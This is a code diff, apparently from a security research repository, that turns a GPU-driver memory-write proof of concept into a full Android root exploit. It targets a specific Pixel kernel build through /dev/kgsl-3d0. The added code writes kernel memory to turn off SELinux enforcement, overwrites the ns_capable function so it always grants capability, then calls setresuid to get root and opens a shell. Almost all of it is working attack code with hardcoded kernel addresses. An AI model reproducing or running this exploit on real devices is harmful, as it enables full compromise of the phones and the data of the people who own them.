@@ -261,7 +261,7 @@ static int DoWrite(int fd, int ctx_id, uint32_t* payload_buf, uint64_t payload_g
     }
     fprintf(stderr, "\n");
 #endif
-    usleep(100000);
+    usleep(500000);
     // we don't need Adrenaline's multiple IB stuff - we just use it to run one IB
     // see https://github.com/github/securitylab/blob/105618fc1fa83c08f4446749e64310b539cb0262/SecurityExploits/Android/Qualcomm/CVE_2022_25664/adreno_kernel/adreno_kernel.c#L188
     int err = kgsl_gpu_command_payload(fd, ctx_id, /*gpuaddr=*/0, /*cmd_size=*/0, /*n=*/1, /*target_idx=*/0, payload_gpuaddr, cmd_size);
@@ -269,6 +269,7 @@ static int DoWrite(int fd, int ctx_id, uint32_t* payload_buf, uint64_t payload_g
         fprintf(stderr, "Can't run payload: %s\n", strerror(err));
         return 1;
     }
+    usleep(500000);
     return 0;
 }
 
@@ -426,6 +427,61 @@ int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
     return 0;
 }
 
+int cheese_shutdown(struct cheese_gpu_rw* cheese);
+
+int cheese_reopen(struct cheese_gpu_rw* cheese) {
+    if (cheese_shutdown(cheese)) {
+        return 1;
+    }
+    int fd = open("/dev/kgsl-3d0", O_RDWR);
+    if (fd == -1) {
+        fprintf(stderr, "Can't open kgsl\n");
+        return 1;
+    }
+
+    uint32_t ctx_id;
+
+    int err = kgsl_ctx_create0(fd, &ctx_id);
+    if (err) {
+        fprintf(stderr, "Can't create context: %s\n", strerror(err));
+        return 1;
+    }
+
+    uint32_t* payload_buf = mmap(NULL, PAGE_SIZE,
+                                        PROT_READ|PROT_WRITE,
+                                        MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+    if (payload_buf == MAP_FAILED) {
+        fprintf(stderr, "Can't map buf: %s\n", strerror(errno));
+        return 1;
+    }
+
+    uint64_t payload_gpuaddr;
+
+    err = kgsl_map(fd, (unsigned long)payload_buf, PAGE_SIZE, &payload_gpuaddr);
+    if (err) {
+        fprintf(stderr, "Can't map to gpu: %s\n", strerror(err));
+        return 1;
+    }
+
+    uint32_t* output_buf = (uint32_t *) mmap(NULL, PAGE_SIZE,
+        PROT_READ|PROT_WRITE,
+        MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+
+    uint64_t output_gpuaddr;
+    err = kgsl_map(fd, (unsigned long)output_buf, PAGE_SIZE, &output_gpuaddr);
+    if (err) {
+        fprintf(stderr, "Can't map to gpu: %s\n", strerror(err));
+        return 1;
+    }
+    cheese->fd = fd;
+    cheese->ctx_id = ctx_id;
+    cheese->payload_buf = payload_buf;
+    cheese->payload_gpuaddr = payload_gpuaddr;
+    cheese->output_buf = output_buf;
+    cheese->output_gpuaddr = output_gpuaddr;
+    return 0;
+}
+
 int cheese_physwrite(struct cheese_gpu_rw* cheese, uint64_t target_write_physical_address, uint32_t count, uint32_t* values) {
     if (setup_pagetables(cheese->target_physical_page, 1, cheese->phyaddr, kFakeGpuAddr, target_write_physical_address & ~0xfffull)) {
         return 1;
@@ -462,9 +518,19 @@ int cheese_shutdown(struct cheese_gpu_rw* cheese) {
 }
 
 int main() {
+    if (!setresuid(0, 0, 0)) {
+        fprintf(stderr, "you're already patched?");
+        execlp("sh", "sh", (char *) NULL);
+        return 1;
+    }
     struct cheese_gpu_rw cheese = {};
     if (cheese_gpu_rw_setup(&cheese)) {
         fprintf(stderr, "can't get GPU r/w\n");
+        return 1;
+    }
+    sleep(1);
+    if (cheese_reopen(&cheese)) {
+        fprintf(stderr, "reopen cheese\n");
         return 1;
     }
     // crosshatch-rq1a.201205.003.a1
@@ -472,16 +538,43 @@ int main() {
     // 80080000-823fffff : Kernel code
     // 82c00000-83885fff : Kernel data
     // /proc/kallsyms:
-    // ffffff80acbaa017 r linux_proc_banner
     // ffffff80aac80000 T _text
-    uint64_t target_write_physical_address = 0x80080000ull + (0xffffff80acbaa018ull - 0xffffff80aac80000ull);
-    //               01234567
-    char value[8] = "p Hey1";
-    if (cheese_physwrite(&cheese, target_write_physical_address, 2, (uint32_t*)value)) {
-        fprintf(stderr, "can't write\n");
-        return 1;
+    // ffffff80adcc0e10 b selinux_state
+    // https://github.com/LineageOS/android_kernel_google_msm-4.9/blob/cf7420326fc9659917177acb536a2a9a8bf65bfc/security/selinux/include/security.h#L96
+
+    {
+        uint64_t target_write_physical_address = 0x80080000ull + (0xffffff80adcc0e10ull - 0xffffff80aac80000ull);
+        // disabled, enforcing, checkreqprot, initialized
+        uint32_t value = (0 << 0) | (0 << 8) | (0 << 16) | (1 << 24);
+        if (cheese_physwrite(&cheese, target_write_physical_address, 1, &value)) {
+            fprintf(stderr, "can't write\n");
+            return 1;
+        }
     }
     sleep(1);
-    // now check /proc/version
+    if (cheese_reopen(&cheese)) {
+        fprintf(stderr, "reopen cheese\n");
+        return 1;
+    }
+    {
+        // /proc/kallsyms:
+        // ffffff8f64080000 T _text
+        // ffffff8f659c0dd0 t ns_capable
+        uint64_t target_write_physical_address = 0x80080000ull + (0xffffff8f659c0dd0ull - 0xffffff8f64080000ull);
+        // 0: 52800020     	mov	w0, #0x1                ; =1
+        // 4: d65f03c0     	ret
+        uint32_t values[2] = {0x52800020, 0xd65f03c0};
+        if (cheese_physwrite(&cheese, target_write_physical_address, 2, values)) {
+            fprintf(stderr, "can't write code\n");
+            return 1;
+        }
+    }
+    sleep(3);
+    fprintf(stderr, "trying setresuid...\n");
+    if (setresuid(0, 0, 0)) {
+        fprintf(stderr, "can't setresuid: %s\n", strerror(errno));
+        return 1;
+    }
+    execlp("sh", "sh", (char *) NULL);
     return 0;
 }
